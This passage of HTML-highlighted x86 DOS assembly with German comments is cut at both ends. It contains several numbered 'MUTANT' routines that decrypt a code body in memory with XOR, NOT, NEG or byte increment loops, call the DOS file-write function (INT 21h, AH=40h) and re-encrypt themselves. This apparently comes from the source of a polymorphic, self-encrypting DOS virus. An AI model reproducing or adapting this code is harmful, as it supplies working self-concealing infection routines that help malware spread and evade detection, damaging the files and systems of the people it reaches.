                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03F06</span><span class="sc0">
</span><span class="sc5">J03EFE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">J03F05</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03F06</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">                      </span><span class="sc1">; BP =</span><span class="sc0">
</span><span class="sc5">J03F07</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03EFE</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03F3C</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03F07</span><span class="sc0">

</span><span class="sc5">J03F0E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
</span><span class="sc5">J03F10</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; DS = CS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03F38</span><span class="sc0">                  </span><span class="sc1">; BP = OFFSET $+3</span><span class="sc0">
</span><span class="sc5">J03F15</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">                  </span><span class="sc1">; CX = xx84</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">23A1h</span><span class="sc0">                </span><span class="sc1">; BP = 2831</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">                   </span><span class="sc1">; BX = 2831</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc0">                  </span><span class="sc1">; CX = 2384</span><span class="sc0">
</span><span class="sc5">J03F1F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03EFE</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03F1F</span><span class="sc0">                  </span><span class="sc1">; = LOOP 3F1F</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">                   </span><span class="sc1">; AX=BP=2831</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; BX=4C00</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">008Eh</span><span class="sc0">                </span><span class="sc1">; BP=</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">                      </span><span class="sc1">; BP=egal</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03F05</span><span class="sc0">                  </span><span class="sc1">; = RET</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; AX=2831</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; AX = 0</span><span class="sc0">
</span><span class="sc5">J03F38</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">                      </span><span class="sc1">; BP=2831</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">RETF</span><span class="sc0">                            </span><span class="sc1">; JMP FAR CS:2830</span><span class="sc0">

</span><span class="sc5">J03F3C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc5">mut_8</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03F0E</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( MUTANT #7 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mut_7</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">J03F47</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03F52</span><span class="sc0">
</span><span class="sc5">J03F4A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03F52</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">J03F53</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03F4A</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03F86</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03F53</span><span class="sc0">

</span><span class="sc5">J03F5A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
</span><span class="sc5">J03F5C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03F83</span><span class="sc0">                  </span><span class="sc1">; DX =</span><span class="sc0">
</span><span class="sc5">J03F60</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">23A0h</span><span class="sc0">                </span><span class="sc1">; DX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">8423h</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">                   </span><span class="sc1">; CX = 2384</span><span class="sc0">
</span><span class="sc5">J03F6B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03F4A</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03F6B</span><span class="sc0">                  </span><span class="sc1">; LOOP</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; AX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; BX = , DX = BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">008Eh</span><span class="sc0">                </span><span class="sc1">; DX =</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; BX = , DX =</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; DX = ????</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03F85</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; DS = ES</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; AX = 0</span><span class="sc0">
</span><span class="sc5">J03F83</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; DX =</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">J03F85</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">                            </span><span class="sc1">; JMP 2831</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03F86</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">J03F89</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">mut_7</span><span class="sc0">
                </span><span class="sc6">XLAT</span><span class="sc0">                            </span><span class="sc1">; MOV AL,[BX+AL]</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
</span><span class="sc5">J03F8E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03F5A</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 12 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_12</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03FA0</span><span class="sc0">            </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">

</span><span class="sc5">J03F92</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc5">mut_12</span><span class="sc0">
</span><span class="sc1">;==========================================================</span><span class="sc0">
</span><span class="sc5">J03F99</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03FA7</span><span class="sc0">

</span><span class="sc5">J03F9B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03FA0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03FCC</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03FA0</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03F92</span><span class="sc0">

        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
</span><span class="sc5">J03FA7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03F9B</span><span class="sc0">
</span><span class="sc5">J03FAA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">239Fh</span><span class="sc0">                </span><span class="sc1">; BX = ; DS = CS</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">1Ah</span><span class="sc0">                 </span><span class="sc1">; CX =</span><span class="sc0">
</span><span class="sc5">J03FB2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03FCC</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03FB2</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">008Eh</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03FCB</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03F9B</span><span class="sc0">
</span><span class="sc5">J03FC1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">23B4h</span><span class="sc0">                </span><span class="sc1">; BX = , BX &lt;-</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J03FCB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">                            </span><span class="sc1">; = JMP 2831</span><span class="sc0">

</span><span class="sc5">J03FCC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 11 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mut_11</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03FEC</span><span class="sc0">            </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">

</span><span class="sc5">J03FDE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc5">CALL_int21</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc4">,</span><span class="sc5">mut_11</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03FF3</span><span class="sc0">

</span><span class="sc5">J03FE7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J03FEB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03FEC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04019</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03FEC</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03FDE</span><span class="sc0">

        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
</span><span class="sc5">J03FF3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03FE7</span><span class="sc0">
</span><span class="sc5">J03FF6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">239Fh</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001Ah</span><span class="sc0">        </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; CX = 2385</span><span class="sc0">
</span><span class="sc5">J04000</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04019</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J04000</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">008Eh</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03FEB</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03FE7</span><span class="sc0">
</span><span class="sc5">J0400F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">23B7h</span><span class="sc0">        </span><span class="sc1">; BX &lt;-</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; RET</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J04019</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 14)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mut_14</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J04042</span><span class="sc0">            </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">

</span><span class="sc5">J0402A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">        </span><span class="sc1">; Schreiben !</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">              </span><span class="sc1">; CALL INT 21h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">STC</span><span class="sc0">
                </span><span class="sc6">NOP</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J04049</span><span class="sc0">

</span><span class="sc5">J04042</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04042</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0402A</span><span class="sc0">

</span><span class="sc5">J04049</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0406E</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">Code_Len</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">23A9h</span><span class="sc0">
</span><span class="sc5">J04053</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04053</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
